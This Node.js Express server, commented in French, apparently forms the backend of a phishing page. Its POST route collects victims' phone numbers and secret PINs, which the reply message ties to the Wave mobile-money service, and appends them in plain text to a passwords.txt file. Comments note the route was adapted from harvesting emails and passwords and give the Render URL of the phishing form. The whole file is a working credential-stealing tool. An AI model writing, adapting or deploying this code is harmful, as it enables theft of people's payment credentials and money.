// Import des modules nécessaires
const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");

// Création de l'application Express
const app = express();
const PORT = process.env.PORT || 10000; // IMPORTANT pour Render

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Sert le dossier STOKE (frontend)
app.use(express.static(path.join(__dirname, "..", "STOKE")));

// Chemin du fichier passwords.txt (dans backend/)
const FILE_PATH = path.join(__dirname, "passwords.txt");

// === ROUTE SAVE — Enregistrement des données depuis n’importe quel appareil ===

// MODIFIÉ : Cette route reçoit maintenant les données 'phone' et 'pin' de notre formulaire HTML.
// L'action du formulaire HTML est <form action="https://mon-projet-2-oq6y.onrender.com" method="POST">
// Le chemin doit donc être '/' et non '/save' pour fonctionner avec notre HTML.
app.post("/", (req, res) => {
  // MODIFIÉ : Récupère 'phone' et 'pin' au lieu de 'email' et 'password'
  const { phone, pin } = req.body;
  // MODIFIÉ : Vérifie si 'phone' et 'pin' sont présents
  if (!phone || !pin) {
    return res.status(400).send("Numéro de téléphone et code secret requis");
  }

  // MODIFIÉ : Ligne enregistrée dans passwords.txt avec les nouvelles données
  const line = `Téléphone: ${phone} | PIN: ${pin}\n`;

  fs.appendFile(FILE_PATH, line, (err) => {
    if (err) {
      console.error("Erreur écriture fichier:", err);
      return res.status(500).send("Impossible d’enregistrer");
    }

    console.log("Nouvelles données enregistrées :", line);
    res.json({ success: true, message: "Données Wave enregistrées." });
  });
});

// === Route racine renvoyant index.html ===
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "..", "STOKE", "index.html"));
});

// === Démarrage du serveur ===
app.listen(PORT, () => {
  console.log(`Serveur online sur port ${PORT}`);
});